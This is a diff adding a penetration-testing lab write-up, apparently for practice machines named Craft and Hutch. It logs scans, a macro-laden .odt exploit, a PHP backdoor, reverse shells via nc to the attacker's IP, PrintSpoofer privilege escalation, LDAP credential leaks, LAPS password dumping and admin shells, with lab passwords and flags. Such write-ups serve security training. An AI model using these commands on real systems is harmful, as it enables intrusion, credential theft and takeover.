@@ -1,0 +1,562 @@
+┌──(kali㉿kali)-[~/craft]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.168.169       
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 10:03 CEST
+Nmap scan report for 192.168.168.169
+Host is up (0.047s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-title: Craft
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   43.18 ms 192.168.45.1
+2   42.72 ms 192.168.45.254
+3   43.75 ms 192.168.251.1
+4   ... 30
+
+The web application on port 80 have an upload button that is only accepting .odt file.
+
+I had to research on how to generate malicious .odt file. https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/misc/openoffice_document_macro.md helped me with this.
+
+Also it seemed to me that there is an automation on the opening of the document since no upload directory appeared on the url whenever I upload a file.
+
+msf6 > use exploit/multi/misc/openoffice_document_macro
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(multi/misc/openoffice_document_macro) > set payload /windows/x64/shell_reverse_tcp
+payload => windows/x64/shell_reverse_tcp
+msf6 exploit(multi/misc/openoffice_document_macro) > set target 0
+target => 0
+msf6 exploit(multi/misc/openoffice_document_macro) > set lhost 192.168.45.180
+lhost => 192.168.45.180
+msf6 exploit(multi/misc/openoffice_document_macro) > set srvhost 192.168.45.180
+srvhost => 192.168.45.180
+msf6 exploit(multi/misc/openoffice_document_macro) > options
+
+Module options (exploit/multi/misc/openoffice_document_macro):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   BODY                       no        The message for the document body
+   FILENAME  msf.odt          yes       The OpenOffice Text document name
+   SRVHOST   192.168.45.180   yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT   8080             yes       The local port to listen on.
+   SSL       false            no        Negotiate SSL for incoming connections
+   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                    no        The URI to use for this exploit (default is random)
+
+
+Payload options (windows/x64/shell_reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.45.180   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Apache OpenOffice on Windows (PSH)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/misc/openoffice_document_macro) > exploit
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.45.180:4444 
+[*] Using URL: http://192.168.45.180:8080/pPfJ57rXMGK9uXG
+msf6 exploit(multi/misc/openoffice_document_macro) > [*] Server started.
+[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
+[*] Packaging file: Basic/Standard/Module1.xml
+[*] Packaging file: Basic/Standard/script-lb.xml
+[*] Packaging file: Basic/script-lc.xml
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
+[*] Packaging file: Configurations2/accelerator/current.xml
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
+[*] Packaging file: META-INF/manifest.xml
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
+[*] Packaging file: Thumbnails/thumbnail.png
+[*] Packaging file: content.xml
+[*] Packaging file: manifest.rdf
+[*] Packaging file: meta.xml
+[*] Packaging file: mimetype
+[*] Packaging file: settings.xml
+[*] Packaging file: styles.xml
+[+] msf.odt stored at /root/.msf4/local/msf.odt
+[*] 192.168.168.169  openoffice_document_macro - Sending payload
+[*] Command shell session 1 opened (192.168.45.180:4444 -> 192.168.168.169:49755) at 2025-07-04 13:08:44 +0200
+
+msf6 exploit(multi/misc/openoffice_document_macro) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                                      Connection
+  --  ----  ----               -----------                                                      ----------
+  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 10.0.17763.2029] -----  192.168.45.180:4444 -> 192.168.168.169:49755 (192.168.168.169)
+
+msf6 exploit(multi/misc/openoffice_document_macro) > sessions i 1
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                                      Connection
+  --  ----  ----               -----------                                                      ----------
+  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 10.0.17763.2029] -----  192.168.45.180:4444 -> 192.168.168.169:49755 (192.168.168.169)
+
+msf6 exploit(multi/misc/openoffice_document_macro) > sessions -i 1
+[*] Starting interaction with 1...
+
+
+Shell Banner:
+Microsoft Windows [Version 10.0.17763.2029]
+-----
+          
+
+C:\Program Files\LibreOffice\program>whoami
+whoami
+craft\thecybergeek
+
+C:\Program Files\LibreOffice\program>hostname
+hostname
+CRAFT
+
+PS C:\Users\thecybergeek> cd desktop
+cd desktop
+PS C:\Users\thecybergeek\desktop> ls
+ls
+
+
+    Directory: C:\Users\thecybergeek\desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         7/4/2025   4:04 AM             34 local.txt                                                             
+
+
+PS C:\Users\thecybergeek\desktop> cat local.txt
+cat local.txt
+54814fa86ba3c38feb3e31eb548422d9
+
+To escalate privileges, winpease and Powerups could not help me. I tried to go through the apache user who is the owner of the web application which is hosted in C:\xampp\htdocs
+
+PS C:\users\public> icacls C:\xampp
+icacls C:\xampp
+C:\xampp CRAFT\apache:(OI)(CI)(F)
+         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+         BUILTIN\Administrators:(I)(OI)(CI)(F)
+         BUILTIN\Users:(I)(OI)(CI)(RX)
+         BUILTIN\Users:(I)(CI)(AD)
+         BUILTIN\Users:(I)(CI)(WD)
+         CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\users\public> icacls C:\xampp\htdocs
+icacls C:\xampp\htdocs
+C:\xampp\htdocs CRAFT\apache:(OI)(CI)(F)
+                CRAFT\apache:(I)(OI)(CI)(F)
+                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                BUILTIN\Administrators:(I)(OI)(CI)(F)
+                BUILTIN\Users:(I)(OI)(CI)(RX)
+                BUILTIN\Users:(I)(CI)(AD)
+                BUILTIN\Users:(I)(CI)(WD)
+                CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\users\public> 
+
+These directories are writable by BUILTIN\Users. I uploaded simple_backdoor.php payload and noticed I could execute commands with it via the browser. I decided to get a reverse shell as Apache. i used this reverse shell php payload https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
+I modified the payload to suit the environment because the C:\windows\temp directory was not writable to Apache user. I replaced it with C:\xampp\htdocs, then I added my kali ip and listening port. after this i uploaded the payload and executed it from the browser and got a reverse shell as Apache.
+
+──(kali㉿kali)-[~/craft]
+└─$ sudo rlwrap nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [192.168.45.180] from (UNKNOWN) [192.168.168.169] 52078
+b374k shell : connected
+
+Microsoft Windows [Version 10.0.17763.2029]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs>whoami
+whoami
+craft\apache
+
+C:\xampp\htdocs>hostname
+hostname
+CRAFT
+
+C:\xampp\htdocs>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID                                         
+============ ============================================
+craft\apache S-1-5-21-537427935-490066102-1511301751-1000
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeTcbPrivilege                Act as part of the operating system       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+ERROR: Unable to get user claims information.
+
+This user has seeimpersonation enabled, I transferred printspofer and nc64.exe to the target and used it to escalate my privilege
+
+C:\Users\Public>.\PrintSpoofer.exe -c "nc64.exe 192.168.45.180 4443 -e cmd"
+.\PrintSpoofer.exe -c "nc64.exe 192.168.45.180 4443 -e cmd"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+
+C:\Users\Public>
+
+
+
+
+┌──(kali㉿kali)-[~/craft]
+└─$ sudo rlwrap nc -lnvp 4443
+[sudo] password for kali: 
+listening on [any] 4443 ...
+connect to [192.168.45.180] from (UNKNOWN) [192.168.168.169] 52087
+Microsoft Windows [Version 10.0.17763.2029]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+CRAFT
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>
+
+C:\Windows>cd ..
+cd ..
+
+C:\>cd users
+cd users
+
+C:\Users>cd administrator
+cd administrator
+
+C:\Users\Administrator>type Desktop\proof.txt
+type Desktop\proof.txt
+6253116f0c7b6d814ac07171010c8c00
+
+
+#Getting a shell as another user 
+.\RunasCs.exe thecybergeek ABasedHacker! "cmd /c whoami /all"
+.\RunasCs.exe thecybergeek ABasedHacker! "nc64.exe 192.168.45.180 444 -e cmd.exe" -t 0
+
+
+#hutch
+
+┌──(kali㉿kali)-[~/hutch]
+└─$ sudo nmap -sV -sC -A -Pn -sT -T5 192.168.222.122 -p 1-65300
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 07:48 CEST
+Nmap scan report for 192.168.222.122
+Host is up (0.047s latency).
+Not shown: 65280 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+| http-webdav-scan: 
+|   Server Type: Microsoft-IIS/10.0
+|   Server Date: Sat, 05 Jul 2025 05:50:19 GMT
+|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+|_  WebDAV type: Unknown
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-05 05:49:27Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC
+49753/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -23s
+| smb2-time: 
+|   date: 2025-07-05T05:50:22
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   51.62 ms 192.168.45.1
+2   50.39 ms 192.168.45.254
+3   52.67 ms 192.168.251.1
+4   49.36 ms 192.168.222.122
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 179.81 seconds
+
+Tried som directory bruteforce on the web app on port 80
+
+feroxbuster -u http://192.168.168.169 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
+
+feroxbuster -u http://192.168.168.169
+# enumerate virtual host
+sudo wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://hutch.offsec" -H "Host: FUZZ.http://hutch.offsec" --sc 200,202,204,301,302,307,403
+
+Nothing seems interesting.
+I tried smb guest and anonymous enumeration but nothing interesting.
+
+I moved over to ldap enumeration I got the list of user accounts on the AD and with the following commands, I got the user lists
+
+┌──(hutch)─(kali㉿kali)-[~/hutch]
+└─$ python3 windapsearch.py -d hutch.offsec --dc-ip 192.168.222.122 --custom "objectclass=*"
+┌──(hutch)─(kali㉿kali)-[~/hutch]
+└─$ python3 windapsearch.py -d hutch.offsec --dc-ip 192.168.222.122 -U
+
+I tried to create wordlists to bruteforce passwords but none seem to work including the machine name hutch
+
+#I enumerated further with ldapsearch to see If i could find more info.
+This command listed more information about users to me which exposed a user cred:
+
+┌──(kali㉿kali)-[~/hutch]
+└─$ ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.222.122" "(objectclass=*)"
+# Freddy McSorley, Users, hutch.offsec
+dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Freddy McSorley
+description: Password set to CrabSharkJellyfish192 at user's request. Please c
+ hange on next login.
+distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20210216133934.0Z
+uSNCreated: 12831
+uSNChanged: 49179
+name: Freddy McSorley
+objectGUID:: TxilGIhMVkuei6KplCd8ug==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132489437036308102
+lastLogoff: 0
+lastLogon: 132579563744834908
+pwdLastSet: 132489417058152751
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: fmcsorley
+sAMAccountType: 805306368
+userPrincipalName: fmcsorley@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+lastLogonTimestamp: 132579563744834908
+msDS-SupportedEncryptionTypes: 0
+
+
+cn: Freddy McSorley
+description: Password set to CrabSharkJellyfish192 at user's request. Please c
+ hange on next login.
+
+
+#You can also use this command to get just list of all users b greping the samaccountname alone:
+
+┌──(kali㉿kali)-[~/hutch]
+└─$ ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.222.122" "(objectclass=*)" |grep sAMAccountName
+ldap_initialize( ldap://192.168.222.122:389/??base )
+filter: (objectclass=*)
+requesting: All userApplication attributes
+sAMAccountName: Guest
+sAMAccountName: Domain Computers
+sAMAccountName: Cert Publishers
+sAMAccountName: Domain Users
+sAMAccountName: Domain Guests
+sAMAccountName: Group Policy Creator Owners
+sAMAccountName: RAS and IAS Servers
+sAMAccountName: Allowed RODC Password Replication Group
+sAMAccountName: Denied RODC Password Replication Group
+sAMAccountName: Enterprise Read-only Domain Controllers
+sAMAccountName: Cloneable Domain Controllers
+sAMAccountName: Protected Users
+sAMAccountName: DnsAdmins
+sAMAccountName: DnsUpdateProxy
+sAMAccountName: rplacidi
+sAMAccountName: opatry
+sAMAccountName: ltaunton
+sAMAccountName: acostello
+sAMAccountName: jsparwell
+sAMAccountName: oknee
+sAMAccountName: jmckendry
+sAMAccountName: avictoria
+sAMAccountName: jfrarey
+sAMAccountName: eaburrow
+sAMAccountName: cluddy
+sAMAccountName: agitthouse
+sAMAccountName: fmcsorley
+
+
+Enumerating smb as user fmcsorley shows that the user only had access to default shares with noting interesting.
+
+I extracted the AD info to bloodhound and see that this user have the "ReadLapsPassword" permission.
+
+I exploited it with this tool https://github.com/n00py/LAPSDumper
+
+┌──(kali㉿kali)-[~/hutch]
+└─$ python3 laps.py -u fmcsorley -p 'CrabSharkJellyfish192' -d hutch.offsec
+LAPS Dumper - Running at 07-05-2025 11:11:04
+HUTCHDC @U{tP9gA%Nx}ri
+
+┌──(kali㉿kali)-[~/hutch]
+└─$ nxc smb 192.168.222.122 -u administrator -p @U{tP9gA%Nx}ri                     
+SMB         192.168.222.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False) 
+SMB         192.168.222.122 445    HUTCHDC          [+] hutch.offsec\administrator:@U{tP9gA%Nx}ri (Pwn3d!)
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/hutch]
+└─$ nxc winrm 192.168.222.122 -u administrator -p @U{tP9gA%Nx}ri
+WINRM       192.168.222.122 5985   HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.222.122 5985   HUTCHDC          [+] hutch.offsec\administrator:@U{tP9gA%Nx}ri (Pwn3d!)
+
+┌──(kali㉿kali)-[~/hutch]
+└─$ evil-winrm -i 192.168.222.122 -u administrator -p '@U{tP9gA%Nx}ri' 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+hutch\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+hutchdc
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        11/3/2020   9:04 PM                3D Objects
+d-r---        11/3/2020   9:04 PM                Contacts
+d-r---        11/8/2020   5:32 PM                Desktop
+d-r---        11/3/2020   9:04 PM                Documents
+d-r---        11/3/2020   9:04 PM                Downloads
+d-r---        11/3/2020   9:04 PM                Favorites
+d-r---        11/3/2020   9:04 PM                Links
+d-r---        11/3/2020   9:04 PM                Music
+d-r---        11/3/2020   9:04 PM                Pictures
+d-r---        11/3/2020   9:04 PM                Saved Games
+d-r---        11/3/2020   9:04 PM                Searches
+d-r---        11/3/2020   9:04 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cat Desktop\proof.txt
+5daf5507cdf74f684b4342e4c98d1f89
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        11/3/2020   9:37 PM                .NET v2.0
+d-----        11/3/2020   9:37 PM                .NET v2.0 Classic
+d-----        11/3/2020   9:39 PM                .NET v4.5
+d-----        11/3/2020   9:39 PM                .NET v4.5 Classic
+d-----        11/4/2020   4:07 AM                Administrator
+d-----        11/3/2020   9:37 PM                Classic .NET AppPool
+d-----        11/3/2020  10:09 PM                domainadmin
+d-----        11/3/2020  10:19 PM                fmcsorley
+d-r---        11/4/2020   4:07 AM                Public
+
+
+*Evil-WinRM* PS C:\Users> 
+*Evil-WinRM* PS C:\Users> cd fmcsorley
+
+*Evil-WinRM* PS C:\Users\fmcsorley> cat Desktop\local.txt
+baa2f2217497f0d41d2f1a60ce0634b8
+*Evil-WinRM* PS C:\Users\fmcsorley> 
+
+
